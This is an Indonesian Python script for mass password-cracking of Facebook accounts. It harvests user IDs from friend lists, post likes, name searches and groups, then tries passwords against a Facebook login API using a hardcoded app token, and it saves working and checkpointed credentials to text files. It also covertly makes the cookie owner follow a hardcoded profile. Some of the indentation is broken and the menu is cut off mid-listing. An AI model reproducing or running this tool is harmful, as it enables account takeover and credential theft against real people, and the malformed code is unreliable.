#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os,sys,re,time,json,random,requests
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor
def clear():
    os.system("clear")
def kata(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./300)
def baner():
    time.sleep(0.1)
    kata(""" 
             \033[1;38;5;208m.@.                                    .
             \033[1;38;5;208m@m@,.                                 .@
           \033[1;38;5;208m.@m%nm@,.                            .@m@
           \033[1;38;5;208m.@nvv%vnmm@,.                      .@mn%n@
          \033[1;38;5;208m.@mnvvv%vvnnmm@,.                .@mmnv%vn@,
        \033[1;38;5;208m@mmnnvvv%vvvvvnnmm@,.        .@mmnnvvv%vvnm@
         \033[1;38;5;208m@mmnnvvvvv%vvvvvvnnmm@, ;;;@mmnnvvvvv%vvvnm@,
        \033[1;38;5;208m`@mmnnvvvvvv%vvvvvnnmmm;;@mmnnvvvvvv%vvvvnmm@
         \033[1;38;5;208m`@mmmnnvvvvvv%vvvnnmmm;%mmnnvvvvvv%vvvvnnmm@
            \033[1;38;5;208m`@m%v%v%v%v%v;%;%;%;%;%;%;%%%vv%vvvvnnnmm@
             \033[1;38;5;208m.,mm@@@@@mm%;;@@m@m@@m@@m@mm;;%%vvvnnnmm@;@,.
         \033[1;38;5;208m.,@mmmmmmvv%%;;@@vmvvvvvvvvvmvm@@;;%%vvnnm@;%mmm@,
       \033[1;38;5;208m.,@mmnnvvvvv%%;;@@vvvvv%%%%%%%vvvvmm@@;;%%mm@;%%nnnnm@,
    \033[1;38;5;208m.,@mnnvv%v%v%v%%;;@mmvvvv%%;*;*;%%vvvvmmm@;;%m;%%v%v%v%vmm@,.
\033[1;38;5;208m,@mnnvv%v%v%v%v%v%v%;;@@vvvv%%;*;*;*;%%vvvvm@@;;m%%%v%v%v%v%v%vnnm@,
\033[1;38;5;208m`@mnnvv%v%v%v%%;;@mvvvvv%%;;*;;%%vvvmmmm@;;%m;%%v%v%v%vmm@'   '
       \033[1;38;5;208m`@mmnnvvvvv%%;;@@mvvvv%%%%%%%vvvvmm@@;;%%mm@;%%nnnnm@'
          \033[1;38;5;208m`@mmmmmmvv%%;;@@mvvvvvvvvvvmmm@@;;%%mmnmm@;%mmm@'
            \033[1;38;5;208m`mm@@@@@mm%;;@m@@m@m@m@@m@@;;%%vvvvvnmm@;@'
            \033[1;38;5;208m,@m%v%v%v%v%v;%;%;%;%;%;%;%;%vv%vvvvvnnmm@
           \033[1;38;5;208m.@mmnnvvvvvvv%vvvvnnmm%mmnnvvvvvvv%vvvvnnmm@
         \033[1;38;5;208m.@mmnnvvvvvv%vvvvvvnnmm'`@mmnnvvvvvv%vvvnnmm@
         \033[1;38;5;208m@mmnnvvvvv%vvvvvvnnmm@':%::`@mmnnvvvv%vvvnm@'
         \033[1;38;5;208m@mmnnvvv%vvvvvnnmm@'`:::%%:::'`@mmnnvv%vvmm@
         \033[1;38;5;208m`@mnvvv%vvnnmm@'     `:;%%;:'     `@mvv%vm@'
           \033[1;38;5;208m`@mnv%vnnm@'          `;%;'         `@n%n@
           \033[1;38;5;208m`@m%mm@'              ;%;.           `@m@
            \033[1;38;5;208m@m@'                 `;%;             `@
             \033[1;38;5;208m`@'                   ;%;.             '    
             \033[1;38;5;208m`                    `;%; 
\033[1;38;5;208m============================================
\033[1;38;5;208m💥DEVLOPER : FAIZUL BOFTEN
\033[1;38;5;208m💥FACEBOOK " FAIZUL
\033[1;38;5;208m💥WA       : 082271426251
\033[1;38;5;208m============================================""")
def balik():
    f=input("\033[00m\t[\033[96mEnter To Back\033[00m]")
    if f == "":
       os.system("python mbf.py")
    else:
       sys.exit("\033[1;91mexit\033[00m")
def mbf():
    time.sleep(0.1)
    print("\033[00m[\033[93m1\033[00m] Login")
    print("\033[00m[\033[93m2\033[00m] Update")
    print("\033[00m[\033[93m3\033[00m] Group WA")
    print("\033[00m[\033[93m4\033[00m] Exit")
    time.sleep(0.1)
    f=input("\n\033[90m> \033[1;93m")
    if f == "1":
         print("\033[1;94m===========================================\033[00m")
         mbasic = 'https://mbasic.facebook.com{}'
         global die,check,result, count
         id = []
         die = 0
         chek = []
         life = []
         count = 0
         check = 0
         result = 0
         def masuk():
             try:
            cek = open("cookies").read()
             except FileNotFoundError:
                    cek = input("\033[90m> \033[00mCoookies : \033[1;92m")
             cek = {"cookie":cek}
             ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
             if "mbasic_logout_button" in str(ismi):
                     if "Apa yang Anda pikirkan sekarang" in str(ismi):
                             with open("cookies","w") as f:
                                     f.write(cek["cookie"])
                     else:
                           print("\033[90m> \033[00mChange the language, please wait\033[1;91m!!\033[00m")
                           try:
                                  requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
                           except:
                                  pass
                     try:
                             ikuti = parser(requests.get(mbasic.format("/xzcoder.xzcoder"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
                             ses.get(mbasic.format(ikuti),cookies=cek)
                     except :
                             pass
                     return cek["cookie"]
             else:
                  exit("\033[00m[\033[91m!\033[00m]\033[00mCookies \033[1;91minvalid!!\033[00m")
         def login(username,password,cek=False):
             global die,check,result,count
             b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
             params = {
                     'access_token': b,
                     'format': 'JSON',
                     'sdk_version': '2',
                     'email': username,
                     'locale': 'en_US',
                     'password': password,
                     'sdk': 'ios',
                     'generate_session_cookies': '1',
                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
             }
             api = 'https://b-api.facebook.com/method/auth.login'
             response = requests.get(api, params=params)
             if 'EAA' in response.text:
                 print(f"\r\033[00m[\033[1;32m✓\033[00m] \033[1;32m{username} \033[90m=> \033[1;32m{password}                       ",end="")
                 print()
                 result += 1
                 if cek:
                        life.append(username+"|"+password)
                 else:
                        with open('results-life.txt','a') as f:
                                f.write(username + '|' + password + '\n')
             elif 'www.facebook.com' in response.json()['error_msg']:
                   print(f"\r\033[00m[\033[1;91mx\033[00m] \033[1;33m{username} \033[90m=> \033[1;33m{password}                    ",end="")
                   print()
                   check += 1
                   if cek:
                           chek.append(username+"|"+password)
                   else:
                           with open('results-check.txt','a') as f:
                                f.write(username + '|' + password + '\n')
             else:
                   die += 1
             for i in list('\|/-•'):
                            print(f"\r\033[00m[\033[1;91m{i}\033[00m] Life : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcheckpoint : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;91m{str(die)}\033[90m)\033[00m",end="")
                            time.sleep(0.2)
         def getid(url):
             raw = requests.get(url,cookies=kuki).content
             getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(raw))
             for x in getuser:
                 if 'profile' in x[0]:
                        id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])
                 elif 'friends' in x:
                        continue
                 else:
                        id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
                 print('\r\033[90m> \033[1;96m' + str(len(id)) + " \033[00mretrieved",end="")
             if 'Lihat Teman Lain' in str(raw):
                 getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
             return id
         def fromlikes(url):
             try:
                  like = requests.get(url,cookies=kuki).content
                  love = re.findall('href="(/ufi.*?)"',str(like))[0]
                  aws = getlike(mbasic.format(love))
                  return aws
             except:
                  exit("\033[90m> \033[1;91mcant dump id\033[00m ")
         def getlike(react):
             like = requests.get(react,cookies=kuki).content
             ids  = re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))
             for user in ids:
                 if 'profile' in user[0]:
                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                 else:
                         id.append(user[1] + "|" + user[0].split('/')[1])
                 print(f'\r\033[90m \033[1;96m{str(len(id))} \033[00mretrieved',end="")
             if 'Lihat Selengkapnya' in str(like):
                 getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
             return id
         def bysearch(option):
         search = requests.get(option,cookies=kuki).content
             users = re.findall('class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>',str(search))
             for user in users:
                  if "profile" in user[0]:
                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                  else:
                         id.append(user[1] + "|" + user[0].split("?")[0])
                  print(f"\r\033[90m> \033[1;96m{str(len(id))} \033[00mretrieved ",end="")
             if "Lihat Hasil Selanjutnya" in str(search):
                  bysearch(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
             return id
         def grubid(endpoint):
             grab = requests.get(endpoint,cookies=kuki).content
             users = re.findall('a class=".." href="/(.*?)">(.*?)</a>',str(grab))
             for user in users:
                 if "profile" in user[0]:
                         id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
                 else:
                         id.append(user[1] + "|" + user[0])
                 print(f"\r\033[90m> \033[1;96m{str(len(id))} \033[00mretrieved ",end="")
             if "Lihat Selengkapnya" in str(grab):
                 grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
             return id
         if __name__ == '__main__':
               try:
                   ses = requests.Session()
                   kukis = masuk()
                   kuki = {'cookie':kukis}
                   clear()
                   baner()
                   kata('\033[31;1m=====================================================')
                   kata('\033[1;97m{\33[1;95m01\033[1;97m}\033[32;1m💥CRACK DAFTAR TEMAN')
                   kata('\033[1;97m{\033[1;95m02\033[1;97m}\033[32;1m💥CRACK LIKE/POST')
                   kata('\033[1;97m{\033[1;95m03\033[1;97m}\033[32;1m💥CRACK DARI PENCARIAN NAMA')
                   kata('\033[1;97m{\033[1;95m04\033[1;97m}\033[32;1m💥CRACK DARI GRUB')
                   kata('\033[1;97m{\033[1;95m05\033[1;97m}\033[32;1m💥CRACK DARI GRUB')
                   kata('\033[1;97m{\033[1;95m05\033[1;97m}\033[32;1m💥CRACK DARI  TEMAN')
                   kata('\033[1;97m{\033[1;95m05\033[1;97m}\033[32;1m💥LIAT  HASIL DUMP')
                   kata('\033[31;1m=======================================================')
